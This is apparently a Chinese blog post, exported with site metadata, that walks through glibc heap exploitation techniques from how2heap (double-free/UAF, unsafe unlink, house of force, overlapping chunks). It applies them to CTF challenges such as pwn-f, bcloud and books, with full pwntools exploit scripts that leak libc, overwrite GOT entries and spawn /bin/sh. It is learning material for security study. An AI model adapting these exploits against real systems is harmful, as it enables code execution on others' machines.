0x555555757030\n0x555555757030:\t0x0000000000000000\t0x0000000000000031\n0x555555757040:\t0x0000555555757070\t0x0000000000000000          // new malloc addr\n0x555555757050:\t0x0000000000000014\t0x0000555555554d6c          // size +  DestroyFunc\n```\n\n再来看一下全局变量的堆管理情况\n\n```\npwndbg> telescope 0x555555554000+0x2020C0\n00:0000│   0x5555557560c0 (__bss_start+32) ◂— 0x1\n01:0008│   0x5555557560c8 (__bss_start+40) —▸ 0x555555757010 ◂— 0x61616161 /* 'aaaa' */\n02:0010│   0x5555557560d0 (__bss_start+48) ◂— 0x1\n03:0018│   0x5555557560d8 (__bss_start+56) —▸ 0x555555757040 —▸ 0x555555757070 ◂— 'aaaaaaaaaabbbbb...'\n04:0020│   0x5555557560e0 (__bss_start+64) ◂— 0x1\n05:0028│   0x5555557560e8 (__bss_start+72) —▸ 0x555555757090 —▸ 0x5555557570c0 ◂— 'ccc\\naaaaaabbbbb...'\n06:0030│   0x5555557560f0 (__bss_start+80) ◂— 0x0\n... ↓\npwndbg> x/6xg 0x555555554000+0x2020C0\n0x5555557560c0:\t0x0000000000000001\t0x0000555555757010\n0x5555557560d0:\t0x0000000000000001\t0x0000555555757040\n0x5555557560e0:\t0x0000000000000001\t0x0000555555757090\n```\n堆管理结构中，前一个为表示是否占用，后一个表示字符串的地址。\n\n看一下删除操作的函数实现：\n```\nif ( *((_QWORD *)&manage + 2 * v1 + 1) )\n  {\n    printf(\"Are you sure?:\");\n    read(0, &buf, 0x100uLL);\n    if ( !strncmp(&buf, \"yes\", 3uLL) )\n    {\n      (*(void (__fastcall **)(_QWORD, const char *))(*((_QWORD *)&manage + 2 * v1 + 1) + 24LL))(\n        *((_QWORD *)&manage + 2 * v1 + 1),\n        \"yes\");\n      *((_DWORD *)&manage + 4 * v1) = 0;\n    }\n  }\n```\n\n官方的源码如下：\n```\nvoid deleteStr() {\n    int id;\n\tchar buf[0x100];\n    printf(\"Pls give me the string id you want to delete\\nid:\");\n    id = getInt();\n    if (id < 0 || id > 0x10) {\n        printf(\"Invalid id\\n\");\n    }\n    if (Strings[id].str) {\n\t\tprintf(\"Are you sure?:\");\n\t\tread(STDIN_FILENO,buf,0x100);\n\t\tif(strncmp(buf,\"yes\",3)) {\n\t\t\treturn;\n\t\t}\n        Strings[id].str->free(Strings[id].str);\n        Strings[id].inuse = 0;\n    }\n}\n```\n\n这里存在一个漏洞，程序检查的是字符串的结构体指针是否为0，但事实上是不可能为0的。同时利用`fastbin`不会检查是否已释放的特点，我们可以构造`double-free`那么我们就可以利用这一点，如果在结构体调用的`DestroyFunc`覆盖为其他函数，我们就可以造成任意函数执行。如果我们将堆上的函数覆盖位`puts`时，程序将会执行`puts(contents)`而不是`free(content)`，通过适当`content`，我们可以泄露程序基址。\n在结构体的`DestroyFunc`部分，即使开了`PIE`，程序的最后三位也是不变的，我们只需要覆盖最后3位或2位即可。\n\n所以总结，此题的漏洞点在`UAF`&`double-free`。\necp:\n\n```\n#! /usr/bin/python\nfrom pwn import *\n\ncontext.log_level = 'debug'\ntarget = process('pwn-f')\n\ndef create(size, string):\n    target.recvuntil('quit')\n    target.sendline('create ')\n    target.recvuntil('size:')\n    target.sendline(str(size))\n    target.recvuntil('str:')\n    target.send(string)\n\n\ndef delete(id):\n    target.recvuntil('quit')\n    target.sendline('delete ')\n    target.recvuntil('id:')\n    target.sendline(str(id))\n    target.recvuntil('sure?:')\n    target.sendline('yes')\n\ncreate(4, 'aaa\\n')\ncreate(4, 'aaa\\n')\ndelete(0)\ndelete(1)\ndelete(0)\ncreate(4, '\\x00')\ncreate(0x20, 'a' * 0x16 + 'lo' + '\\x2d\\x00')\ndelete(0)\n\ntarget.recvuntil('lo')\naddr = target.recvline()\naddr = addr[:-1]\naddr = u64(addr + '\\x00' * (8 - len(addr))) - 0xd2d\n\ndelete(1)\n\ncreate(4, '\\x00')\n\ntarget.recvuntil('quit')\ntarget.sendline('create ')\ntarget.recvuntil('size:')\ntarget.sendline(str(0x20))\ntarget.recvuntil('str:')\ntarget.send('a' * 0x18 + p64(0x00000000000011DC + addr))\n\nprint hex(addr)\n\ntarget.recvuntil('quit')\ntarget.sendline('delete ')\ntarget.recvuntil('id:')\ntarget.sendline('1')\ntarget.recvuntil('sure?:')\n\nropchain = p64(addr + 0x00000000000011e3)   # pop rdi\nropchain += p64(addr + 0x202070)            # got@malloc\nropchain += p64(addr + 0x0000000000000990)  # plt@put\n\nropchain += p64(addr + 0x00000000000011e3)  # pop rdi\nropchain += p64(1)\nropchain += p64(addr + 0x00000000000011DA)  # magic\nropchain += p64(0)                          # rbx\nropchain += p64(1)                          # rbp\nropchain += p64(addr + 0x0000000000202058)  # r12 -> rip got@read\nropchain += p64(8)                          # r13 -> rdx\nropchain += p64(addr + 0x0000000000202078)  # r14 -> rsi got@atoi\nropchain += p64(0)                          # r15 -> rdi\nropchain += p64(addr + 0x00000000000011C0)  # magic\nropchain += 'a'*8*7\n\nropchain += p64(addr + 0x0000000000000B65)  # getInt\n\ntarget.sendline('yes     ' + ropchain)\naddr = target.recvline()[:-1]\naddr = u64(addr + '\\x00' * (8 - len(addr)))\n#addr = addr - 534112 + 288144\naddr = addr - 537984 + 283536\nprint hex(addr)\ntarget.sendline(p64(addr)+'/bin/sh')\ntarget.interactive()\n```\n\n另外一种方法，更简单，[参考链接](https://cartermgj.github.io/2016/12/01/Hctf-jiushigan/)\n\n```\nfrom pwn import *\n\ncontext.log_level = 'debug'\nglobal io\nlibc = ELF('/lib/x86_64-linux-gnu/libc.so.6')\nelf = ELF('./pwn-f')\n\ndef create_list(io,length,strr):\n\tio.recvuntil('quit')\n\tio.sendline('create ')\n\tio.recvuntil('Pls give string size:')\n\tio.sendline(length)\n\tio.recvuntil('str:')\n\tio.sendline(strr)\n\ndef delete_list(io,number):\n\tio.recvuntil('quit')\n\tio.sendline('delete ')\n\tio.recvuntil('id:')\n\tio.sendline(number)\n\tio.recvuntil('Are you sure?:')\n\tio.sendline('yes')\n\n\ndef pwn():\n\tglobal io\n\n\tdebug = 1\n\tif debug:\n   \t \tio = process('./pwn-f')\n\telse:\n\t\t#io = remote('127.0.0.1',2333)\n\t\tio = remote('115.28.78.54',80)\n\t\tio.recvuntil('please input you token: ')\n\t\tio.sendline('b66888c818c08d932ea91b8d6a1f122c2y7ZAdbh')\n#------------------------------------------------use fsb to leak __libc_start_main's address\n\tcreate_list(io,'10','aaaa')\n\tcreate_list(io,'10','bbbb')\n\tcreate_list(io,'10','cccc')\n\tdelete_list(io,'0')\n\tdelete_list(io,'1')\n\tdelete_list(io,'2')\n\tcontent1 = \"%175$p\".ljust(24,'a')+'\\xd0\\xf9\\x00'\n\tcreate_list(io,'29',content1)\n\tdelete_list(io,'1')                     #-----printf('%113$p')\n\n\tdata = io.recv(14)\n\tlibc_start_main = int(data,16)-240\n\tprint \"libc_start_main_addr=\"+hex(libc_start_main)\n#--------------------------------------------------caculate system_addr\t\n\tlibc_start_main_offset = libc.symbols['__libc_start_main']\n\tsystem_addr = libc.symbols['system']\n\tsystem_addr = libc_start_main  - libc_start_main_offset + system_addr\n\tprint \"system_addr=\" + hex(system_addr)\n\n\tcreate_list(io,'10','zzzz\\x00')\n\n\tcreate_list(io,'10','aaaa\\x00')\n\tcreate_list(io,'10','bbbb\\x00')\n\tcreate_list(io,'10','cccc\\x00')\n\tdelete_list(io,'2')\n\tdelete_list(io,'3')\n\tdelete_list(io,'4')\n#----------can't have '\\x00' in string.because len(string) must >15.And after '/bin/sh' must have a space.\n\tcontent2 = \"/bin/sh #\".ljust(24,'a')+ p64(system_addr)  \n\tcreate_list(io,'32',content2)\n\tdelete_list(io,'3')                     #system('/bin/sh')\n\t\n\tio.sendline('uname -a')\n\tio.interactive()\n\n\n\nif __name__ == '__main__':\n\twhile True:\n\t\ttry:\n\t\t\tpwn()\n\t\texcept EOFError:\n\t\t\tprint 'guess not success!!!'\n\t\t\tio.close()\n\t\t\ttime.sleep(0.5)\n```\n\n## 0x04 unsafe unlink\n\n这里的unlink分为两种，一个释放堆块的相邻堆块共有两个，当**前一个堆块**空闲时，**向后合并**；当**后一个堆块**空闲时，**向前合并**。\n\nglibc的unlink宏（简化版）：\n```\nFD = P->fd;\nBK = P->bk;\nif(FD->bk == P && BK->fd == P)\n{\n\tFD->bk = P;\n\tBK->fd = P;\n}\n```\n\n当我们存在向后合并的情况时：\n```\n/*\n| chunk1(p1) | chunk2(p2) |\n*/\n#include <stdio.h>\n\nvoid *ptr;\n\nint main()\n{\n\tint prev_size, size, fd, bk;\n\tvoid *p1, *p2;\n\tchar buf[253] = \"\";\n\n\tp1 = malloc(252);\n\tp2 = malloc(252);\n\n\tptr = p1;\n\tprev_size = 0;\n\tsize = 249;\n\tfd = (int)(&ptr) - 0xc;\n\tbk = (int)(&ptr) - 0x8;\n\n\tmemset(buf, 'c', 253);\n\tmemcpy(buf, &prev_size, 4);\n\tmemcpy(buf+4, &size, 4);\n\tmemcpy(buf+8, &fd, 4);\n\tmemcpy(buf+12, &bk, 4);\n\tsize = 248;\n\tmemcpy(&buf[248], &size, 4);\n\tbuf[252] = '\\x00';\n\n\tmemcpy(p1, buf, 253);\n\tfree(p2);\n\treturn 0;\n}\n```\n此时我们free掉p2的话，由于我们伪造了chunk2的pre_presize和pre_inuse位，会使得向后合并的情况发生，fake_chunk会向后融合。再来观察unlink宏\n```\n/*P为fake_chunk，由chunk2->pre_size得到\nP == ptr;\n*/\nFD = P->fd;                     // FD = P->fd = &ptr - 0xc = *(ptr + 0x8)\nBK = P->bk;                    // BK = P->bk = &ptr - 0x8 = *(ptr + 0xc)\nif(FD->bk == P && BK->fd == P)\n/*\n\t此时\n    FD->bk = ptr = *(&ptr - 0xc + 0xc)\n    BK->fd = ptr = *(&ptr - 0x8 + 0x8)\n    绕过检查\n*/\n{\n\tFD->bk = BK;                // FD->bk = &ptr - 0x8; ptr == &ptr - 0x8;\n\tBK->fd = FD;                 // BK->fd = &ptr - 0xc; ptr == &ptr - 0xc;\n}\n/*\n最后ptr = &ptr - 0xc\n*/\n```\n\n## 0x05 house of spirit\n\n## 0x09 house of force\n\n我们知道os中存在一个top chunk用来在分配堆块，当我们的bins中不存在合适的堆块时，从top chunk中来切割出合适大小的堆块已分配给用户。\n\n这里我们来看`how2heap`中给出的demo\n\n首先我们定义一个全局变量`bss_var`，值为`This is a string that we want to overwrite.`\n\n我们查看下他的地址为`0x602060`\n```\npwndbg> p &bss_var \n$3 = (char (*)[44]) 0x602060 <bss_var>\n```\n\n然后我们分配一个大小256堆块，地址为`0x7fffffffdec8`\n```\npwndbg> p &p1\n$4 = (intptr_t **) 0x7fffffffdec8\n```\n由于已使用中的chunk要加上8byte的`prev_size`和8byte的`size`\n\n所以真实的chunk的起始地址为`0x603410`\n此时我们查看堆的地址如下\n```\npwndbg> heap \nTop Chunk: 0x603520\nLast Remainder: 0\n\n0x603000 PREV_INUSE {\n  prev_size = 0, \n  size = 1041, \n  fd = 0x20706f7420656854, \n  bk = 0x7473206b6e756863, \n  fd_nextsize = 0x2074612073747261, \n  bk_nextsize = 0x3832353330367830\n}\n0x603410 PREV_INUSE {\n  prev_size = 0, \n  size = 273, \n  fd = 0x0, \n  bk = 0x0, \n  fd_nextsize = 0x0, \n  bk_nextsize = 0x0\n}\n0x603520 PREV_INUSE {\n  prev_size = 0, \n  size = 133857, \n  fd = 0x0, \n  bk = 0x0, \n  fd_nextsize = 0x0, \n  bk_nextsize = 0x0\n}\n```\n此时原先的top chunk的大小为`133857-1`(1为flag位)\n\n我们修改top chunk的size为`-1`(`0xffffffffffffffff`)\n此时，top chunk的大小为\n```\n0x603520 {\n  prev_size = 0, \n  size = 0, \n  fd = 0xffffffffffffffff, \n  bk = 0x0, \n  fd_nextsize = 0x0, \n  bk_nextsize = 0x0\n}\n```\n然后我们分配一个正好在我们欲修改位置毗邻的大小的堆块，这样我们在再下一次malloc时我们就可以分配到想要的位置了\n\n我们分配的大小为`unsigned long evil_size = (unsigned long)bss_var - sizeof(long)*3 - (unsigned long)ptr_top;`\n也就是`0xffffffffffffeb28`，得到这样一个大数以实现堆的反向分配\n\n此时我们再分配就得到了`bbs_var`了，我们可以对`bbs_var`做读写操作了\n\n#### 例题\n\n2017zctf的dragon和2016bctf的bclould\n\n先看2016bctf这题\n在输入姓名时存在有漏洞的截断，当我们输入`i`个字符时，是在第`i+1`的位置添加`\\x00`然而，但是我们后面看到的地址的赋值操作时，会把`\\x00`给覆盖掉，当我们`strcpy`时，就会把堆指针给copy进去。\n\n```\nint sub_80487A1()\n{\n  char buffer; // [sp+1Ch] [bp-5Ch]@1\n  char *_name; // [sp+5Ch] [bp-1Ch]@1\n  int v5; // [sp+6Ch] [bp-Ch]@1\n\n  v5 = *MK_FP(__GS__, 20);\n  memset(&buffer, 0, 80u);\n  puts(\"Input your name:\");\n  read_buf((int)&buffer, 64, 10);\n  _name = (char *)malloc(64u);\n  name_addr = (int)_name;                                     //这里存在将'\\x00'覆盖的情况\n  strcpy(_name, &buffer);\n  sub_8048779((int)_name);\n  return *MK_FP(__GS__, 20) ^ v5;\n}\n```\n\n```\npwndbg> telescope 0x915d008 20\n00:0000│ eax  0x915d008 ◂— 0x61616161 ('aaaa')\n... ↓\n0f:003c│      0x915d044 ◂— 0x62616161 ('aaab')\n10:0040│      0x915d048 —▸ 0x915d008 ◂— 0x61616161 ('aaaa')\n11:0044│ edx  0x915d04c ◂— 0x20f00\n12:0048│      0x915d050 ◂— 0x0\n```\n这里我们能看到输出的是`name_addr`这个指针的值。\n\n接下来的`org`和`host`的copy其实也存在这个漏洞。\n```\nint sub_804884E()\n{\n  char org; // [sp+1Ch] [bp-9Ch]@1\n  char *_org; // [sp+5Ch] [bp-5Ch]@1\n  int host; // [sp+60h] [bp-58h]@1\n  char *_host; // [sp+A4h] [bp-14h]@1\n  int v5; // [sp+ACh] [bp-Ch]@1\n\n  v5 = *MK_FP(__GS__, 20);\n  memset(&org, 0, 0x90u);\n  puts(\"Org:\");\n  read_buf((int)&org, 64, 10);\n  puts(\"Host:\");\n  read_buf((int)&host, 64, 10);\n  _host = (char *)malloc(64u);\n  _org = (char *)malloc(64u);\n  org_addr = (int)_org;\n  host_addr = (int)_host;\n  strcpy(_host, (const char *)&host);\n  strcpy(_org, &org);\n  puts(\"OKay! Enjoy:)\");\n  return *MK_FP(__GS__, 20) ^ v5;\n}\n```\n好吧，其实这里还是细心才能看到的漏洞，我们发现`strcpy(_org, &org);`这里其实是会把`org+_org+host`的数据全部copy到堆上，实事上我们可以调试发现，`host`的数据正好覆盖了top chunk的size，也就是`wildness`，这里我们修改为`0xffffffff`\n\n覆盖前：\n```\n0x945a098:\t0x00000000\t0x00000000\t0x00000000\t0x00000000\n0x945a0a8:\t0x00000000\t0x00000000\t0x00000000\t0x00000000\n0x945a0b8:\t0x00000000\t0x00000000\t0x00000000\t0x00000000\n0x945a0c8:\t0x00000000\t0x00000000\t0x00000000\t0x00000000\n0x945a0d8:\t0x00000000\t0x00020e71\t0x00000000\t0x00000000\n0x945a0e8:\t0x00000000\t0x00000000\t0x00000000\t0x00000000\n```\n覆盖后：\n```\npwndbg> x/40wx 0x945a098\n0x945a098:\t0x61616161\t0x61616161\t0x61616161\t0x61616161\n0x945a0a8:\t0x61616161\t0x61616161\t0x61616161\t0x61616161\n0x945a0b8:\t0x61616161\t0x61616161\t0x61616161\t0x61616161\n0x945a0c8:\t0x61616161\t0x61616161\t0x61616161\t0x61616161\n0x945a0d8:\t0x0945a098\t0xffffffff\t0x00000000\t0x00000000\n0x945a0e8:\t0x00000000\t0x00000000\t0x00000000\t0x00000000\n```\n我们发现`0x945a0d8`这行的值被修改为我们想要的`0xffffffff`了。\n\n这题能够通过`house of force`来解决。\n\n我实现的步骤：\n1. leak name_addr 的堆地址，并通过计算得到top chunk的地址\n2. 修改wildness为`0xffffffff(-1)`\n3. 分配一个大小为`wanted_addr - top_chunk_addr`堆块， 此时再分配得到的堆块即在`wanted_addr`地址上，我们就可以操纵这里的数据了\n4. 修改此处的堆块数据，覆盖`content_addr[]`为`free_got, read_got, atoi_got`\n5. `edit()`id0的结构，修改`free_got`为`printf`\n6. `delete()`id1，泄露`read`的地址\n7. `edit()`id2， 修改`atoi`为`system`\n8. getshell\n\n```\n#!/usr/bin/env python\n# -*- coding: utf-8 -*-\nfrom pwn import *\n\ncontext(log_level = 'critical')\n\np = process('./bcloud')\nelf = ELF('./bcloud')\nlibc = ELF('/lib32/libc.so.6')\n\natoi_got = elf.got['atoi']\nread_got = elf.got['read']\nfree_got = elf.got['free']\nprintf_plt = elf.plt['printf']\n\nbss = 0x0804B060\ncontent_length = 0x0804b0a0\ncontent_addr = 0x804B120\n\ndef new(length, content):\n    p.recvuntil('>>\\n')\n    p.sendline('1')\n    p.recvuntil('content:\\n')\n    p.sendline(str(length))\n    p.recvuntil('content:\\n')\n    p.sendline(content)\n\ndef edit(index, content):\n    p.recvuntil('>>\\n')\n    p.sendline('3')\n    p.recvuntil('id:\\n')\n    p.sendline(str(index))\n    p.recvuntil('content:\\n')\n    p.sendline(content)\n    p.recvuntil('success.\\n')\n\ndef leak_overwrite_wildness():\n    p.recvuntil('name:\\n')\n#   raw_input()\n    p.send('a' * (0x40 - 1) + 'b')\n    p.recvuntil('b')\n    addr = p.recv(4)\n    p.recvline()\n    p.recvuntil('Org:\\n')\n    p.send('a' * 0x40)\n    p.recvuntil('Host:\\n')\n    p.sendline('\\xff\\xff\\xff\\xff')\n    return u32(addr)\n\ndef main():\n#   leak name_heap_addr \n    name_heap_addr = leak_overwrite_wildness()\n    print 'name_heap => ', hex(name_heap_addr - 0x08)\n    base_heap = name_heap_addr + 0xd0\n    print 'base_heap => ', hex(base_heap)\n\n#   malloc a gabage chunk to bss\n    offset = bss - base_heap + 0x30\n    print 'offset => ', offset\n    new(offset, 'abcdabcd') # id0\n\n#   malloc a chunk on bss of free and overwrite content_length[] & content_addr[]\n    payload = ''\n    payload += p32(4)\n    payload += p32(4)\n    payload += p32(4)\n    payload += (content_addr - content_length - len(payload)) * '\\x00'\n    payload += p32(free_got)  # id0\n    payload += p32(read_got)  # id1\n    payload += p32(atoi_got)  # id2\n    new('168', payload)\n\n#   overwrite free_got with printf_plt\n    edit(0, p32(printf_plt))\n\n#   '4.Delete' to printf libc to get system_addr\n    p.recvuntil('>>\\n')\n    p.sendline('4')\n    p.recvuntil('id:\\n')\n    p.sendline(str(1))\n    read_addr = u32(p.recv(4))\n    print 'read_addr => ', read_addr\n\n#   modify atoi to system\n    libc.address = read_addr - libc.symbols['read']\n    system_addr = libc.symbols['system']\n    payload2 = p32(system_addr)\n    edit(2, payload2)\n\n#   getshell\n    p.recvuntil('>>\\n')\n    p.sendline('/bin/sh\\n')\n    p.interactive()\n\nif __name__ == '__main__':\n    main()\n```\n\n## 0x09 overlapping chunks\n\n除了how2heap上演示的extend freed chunks，参考了这篇[文章](http://blog.dazzlepppp.cn/2016/10/15/Producing-Overlapping-Chunks/)后面的内容。\n\n堆块重叠指两块不同的堆块存在重叠部分，以至于我们写任意一块时也会覆写到另一块堆块中。\nhow2heap给出的演示程序中的意思是，当我们修改了一个已经被free了的chunk的size时，我们再次分配就可以得到一个修改后size的堆块，然后就可以构成堆块重叠，修改当前堆块将会修改到后一个堆块。\n\n查阅资料的过程中发现还可以在free之前修改size的大小，但是实际测试会发现在free的时候会崩溃，暂时没有找到原因。\n\n以how2heap例题2015hack.lu的books为例。\n\n存在明显的堆溢出，程序逻辑如下\n```\nsigned __int64 __fastcall main(__int64 a1, char **a2, char **a3)\n{\n  signed __int64 result; // rax@4\n  __int64 v4; // rcx@16\n  signed int v5; // [sp+4h] [bp-BCh]@5\n  void *final_str; // [sp+8h] [bp-B8h]@0\n  void *order1; // [sp+18h] [bp-A8h]@1\n  void *order2; // [sp+20h] [bp-A0h]@1\n  char *dest; // [sp+28h] [bp-98h]@1\n  char s; // [sp+30h] [bp-90h]@6\n  __int64 v11; // [sp+B8h] [bp-8h]@1\n\n  v11 = *MK_FP(__FS__, 40LL);\n  order1 = malloc(0x80uLL);\n  order2 = malloc(0x80uLL);\n  dest = (char *)malloc(0x80uLL);\n  if ( order1 && order2 && dest )\n  {\n    v5 = 0;\n    puts(\" Crappiest and most expensive books for your college education!\\n\\nWe can order books for you in case they're not in stock.\\nMax. two orders allowed!\\n\");\n    while (\n    {\n      if ( v5 )\n      {\n        printf(\"%s\", final_str);\n        printf(dest);                           // fsb\n        result = 0LL;\n        goto finish;\n      }\n      puts(\"1: Edit order 1\");\n      puts(\"2: Edit order 2\");\n      puts(\"3: Delete order 1\");\n      puts(\"4: Delete order 2\");\n      puts(\"5: Submit\");\n      fgets(&s, 128, stdin);\n      switch ( s )\n      {\n        case '1':\n          puts(\"Enter first order:\");\n          edit((__int64)order1);\n          strcpy(dest, \"Your order is submitted!\\n\");\n          continue;\n        case '2':\n          puts(\"Enter second order:\");\n          edit((__int64)order2);\n          strcpy(dest, \"Your order is submitted!\\n\");\n          continue;\n        case '3':\n          delete(order1);\n          continue;\n        case '4':\n          delete(order2);\n          continue;\n        case '5':\n          final_str = malloc(0x140uLL);\n          if ( !final_str )\n          {\n            fwrite(\"Something failed!\\n\", 1uLL, 0x12uLL, stderr);\n            result = 1LL;\n            goto finish;\n          }\n          submit((__int64)final_str, (const char *)order1, (char *)order2);\n          v5 = 1;\n          break;\n        default:\n          continue;\n      }\n    }\n  }\n  fwrite(\"Something failed!\\n\", 1uLL, 0x12uLL, stderr);\n  result = 1LL;\nfinish:\n  v4 = *MK_FP(__FS__, 40LL) ^ v11;\n  return result;\n}\n```\n\n我们发现在`submit`函数这里存在溢出，我们通过修改已经free的chunk2的size为0x151这样在我们malloc是就会得到这款内存，进而在`submit`函数中溢出`dest`，利用格式化字符串。\n\n但是还有一个问题，我们在格式化字符串之后没有再call任何函数，所以我们通过修改`.fini`section为`main`的地址，以再结束后再次运行到`main`，关于`.fini`的作用在[这篇](http://l4u-00.jinr.ru/usoft/WWW/www_debian.org/Documentation/elf/node3.html)中提到了\n\n> .fini\nThis section holds executable instructions that contribute to the process termination code. That is, when a program exits normally, the system arranges to execute the code in this section.\n.init\nThis section holds executable instructions that contribute to the process initialization code. That is, when a program starts to run the system arranges to execute the code in this section before the main program entry point (called main in C programs).\n\n总结来说，.fini是程序结束时的全局析构函数的地址，我们可以通过修改这个来得到控制流。\n\n在程序刚开始的时候就malloc了三个连续的chunk，我们可以随意溢出，但是后面接着的`strcpy`会截断我们的溢出，以至于格式化字符串不能利用，于是我们只能利用`submit`这个还能输里面的`strcat`来溢出`dest`里的字符串来得到格式化字符串。\n\n所以思路如下：\n1. free掉chunk2\n2. 溢出chunk1将chunk2修改为0x151，这样我们在submit的时候就会分配到这个位置\n3. submit溢出dest，利用格式化字符串修改free的低2位（其中1位需要猜，1/16概率），同时修改`.fini`为程序开始\n4. 传入/bin/sh，得到shell\n\n由于我们只能控制eip两次，所以不能有泄露的步骤了，下面的exp是有泄露的步骤的，没有成功\n```\n#!/usr/bin/env python\n# coding=utf-8\nfrom pwn import *\n\nslog = 1 \nlocal = 1\ndebug = 0\n\nglobal p\ncontext(arch='amd64')\n\nif slog: context(log_level = 'debug')\nif local:\n    p = process('./books')\n    libc =  ELF('/lib/x86_64-linux-gnu/libc.so.6')\nelse:\n    p = remote()\n\nif local and debug:\n    gdb.attach(p, open('debug'))\n\nelf = ELF('./books')\nfree_got = elf.got['free']\n\ndef edit1(payload):\n    p.recvuntil('Submit\\n')\n    p.sendline('1')\n    p.recvuntil('order:\\n')\n    p.sendline(payload)\n\ndef edit2(payload):\n    p.recvuntil('Submit\\n')\n    p.sendline('2')\n    p.recvuntil('order:\\n')\n    p.sendline(payload)\n\ndef dele(index):\n    p.recvuntil('Submit\\n')\n    p.sendline(str(index + 2))\n\ndef submit():\n    p.recvuntil('Submit\\n')\n    p.sendline('5')\n\ndef pwn():\n    dele(2)\n    payload = '%1908x' + '%13$hn' # 400a39\n    payload += '%31$lx'\n    payload = payload.ljust(0x80)\n    payload += p64(0) + p64(0x151)\n    edit1(payload)\n    p.recvuntil('Submit\\n')\n    payload = '5'.ljust(8, '\\x00') + p64(0x6011f0)\n#    payload += '%{}x'.format(39 - len(payload)) + '%13$hhn'\n    gdb.attach(p)\n    p.sendline(payload)\n    print p.recvline()\n    print p.recvline()\n    print p.recvline()\n    print p.recvuntil('400fda')\n    leak_addr = int(p.recv(12), 16)\n    print 'leak_addr => ', hex(leak_addr)\n    libc.address = leak_addr - 241 - libc.symbols['__libc_start_main']\n    print 'libc.address => ', hex(libc.address)\n    system_addr = libc.symbols['system']\n    print 'system_addr => ', hex(system_addr)\n\n    dele(2)\n    low_bytes = int(hex(system_addr)[-4:], 16)\n    mid_bytes = int(hex(system_addr)[8:10], 16)\n    payload = '%{}x'.format(int(hex(system_addr)[8:10], 16) - 12) + '%13$hhn'\n    payload += '%{}x'.format(low_bytes - mid_bytes) + '%14$hn'\n    payload = payload.ljust(0x80)\n    payload += p64(0) + p64(0x151)\n#    gdb.attach(p)\n    edit1(payload)\n    p.recvuntil('Submit\\n')\n    payload = '5'.ljust(8, '\\x00') + p64(free_got+2)\n    payload += p64(free_got)\n    p.sendline(payload)\n\nif __name__ == '__main__':\n    pwn()\n    p.interactive()\n```\n\n## 0x0A unsorted bin attack\n\n这个应该是最简单的堆溢出技术了吧，先看当我们释放`unsortbin`时的源码\n\n```\nbck = victim->bk;\n.........\n/* remove from unsorted list */\nunsorted_chunks (av)->bk = bck;\nbck->fd = unsorted_chunks (av);\n```\n并没有使用`unlink`宏，所以这里不存在检查指针的情况，如果我们修改了`victim->bk`的值为`fake_addr`，那么`(av)->bk`也会被修改，同时`fake_addr+16 = victim->bk->fd = (av)`，我们就将一个大的数字写到了`fack_addr+16`的位置去。但是由于`(av)->bk`被破坏了，所以下次再走到这步时可能会出错，具体什么操作出现什么问题还待研究。\n\n这个看似任意地址写但是不能控制写的内容，所以只能作为其他攻击的准备。how2heap给出的方法时修改`global_max_fast`，这样我们在剩下分配其他内存时都会以`fastbin`的方式分配，为`fastbin`攻击做准备。\n\n### 例题\n\n这里用给出的20160ctf的ZeroStorage为例\nOrz我去这程序怎么这么长。。。","slug":"how2heap","published":1,"updated":"2017-05-14T12:47:21.465Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjcpz0k2y0043hv18lk1icuin","content":"<h2 id=\"0x00\"><a href=\"#0x00\" class=\"headerlink\" title=\"0x00\"></a>0x00</h2><p>堆溢出搞了很久，道理我都懂，但是就是在实战中用不起来，只能花功夫一定要在这周把堆溢出啃下来。<br>以<a href=\"https://github.com/shellphish/how2heap\" target=\"_blank\" rel=\"external\">how2heap</a>为学习路径，step by step，记录下，可能的话，帮助到后来的人。</p>\n<blockquote>\n<table>\n<thead>\n<tr>\n<th>File</th>\n<th>Technique</th>\n<th>Applicable CTF Challenges</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><a href=\"first_fit.c\">first_fit.c</a></td>\n<td>演示glibc malloc的首次适应(first-fit)行为</td>\n<td></td>\n</tr>\n<tr>\n<td><a href=\"fastbin_dup.c\">fastbin_dup.c</a></td>\n<td>通过操作fastbin已释放的表，来除法malloc以返回已经分配过的堆指针</td>\n<td></td>\n</tr>\n<tr>\n<td><a href=\"fastbin_dup_into_stack.c\">fastbin_dup_into_stack.c</a></td>\n<td>通过操作fastbin的已释放的表，来触发malloc来得到一个几乎任意指向的指针</td>\n<td><a href=\"https://github.com/ctfs/write-ups-2015/tree/master/9447-ctf-2015/exploitation/search-engine\" target=\"_blank\" rel=\"external\">9447-search-engine</a></td>\n</tr>\n<tr>\n<td><a href=\"unsafe_unlink.c\">unsafe_unlink.c</a></td>\n<td>Exploiting free on a corrupted chunk to get arbitrary write.</td>\n<td><a href=\"http://acez.re/ctf-writeup-hitcon-ctf-2014-stkof-or-modern-heap-overflow/\" target=\"_blank\" rel=\"external\">HITCON CTF 2014-stkof</a></td>\n</tr>\n<tr>\n<td><a href=\"house_of_spirit.c\">house_of_spirit.c</a></td>\n<td>Frees a fake fastbin chunk to get malloc to return a nearly-arbitrary pointer.</td>\n<td><a href=\"https://github.com/ctfs/write-ups-2014/tree/master/hack-lu-ctf-2014/oreo\" target=\"_blank\" rel=\"external\">hack.lu CTF 2014-OREO</a></td>\n</tr>\n<tr>\n<td><a href=\"poison_null_byte.c\">poison_null_byte.c</a></td>\n<td>Exploiting a single null byte overflow.</td>\n<td><a href=\"https://github.com/ctfs/write-ups-2015/tree/master/plaidctf-2015/pwnable/plaiddb\" target=\"_blank\" rel=\"external\">PlaidCTF 2015-plaiddb</a></td>\n</tr>\n<tr>\n<td><a href=\"house_of_lore.c\">house_of_lore.c</a></td>\n<td>Tricking malloc into returning a nearly-arbitrary pointer by abusing the smallbin freelist.</td>\n<td></td>\n</tr>\n<tr>\n<td><a href=\"overlapping_chunks.c\">overlapping_chunks.c</a></td>\n<td>利用覆写已释放在unsortbin链中chunk的size位，去获得一个重叠在已分配chunk的新的分配</td>\n<td><a href=\"https://github.com/ctfs/write-ups-2015/tree/master/hack-lu-ctf-2015/exploiting/bookstore\" target=\"_blank\" rel=\"external\">hack.lu CTF 2015-bookstore</a></td>\n</tr>\n<tr>\n<td><a href=\"house_of_force.c\">house_of_force.c</a></td>\n<td>溢出Top chunk头去分配，来得到一个接近任意地址的指针</td>\n<td><a href=\"https://github.com/ctfs/write-ups-2016/tree/master/boston-key-party-2016/pwn/cookbook-6\" target=\"_blank\" rel=\"external\">Boston Key Party 2016-cookbook</a>, <a href=\"https://github.com/ctfs/write-ups-2016/tree/master/bctf-2016/exploit/bcloud-200\" target=\"_blank\" rel=\"external\">BCTF 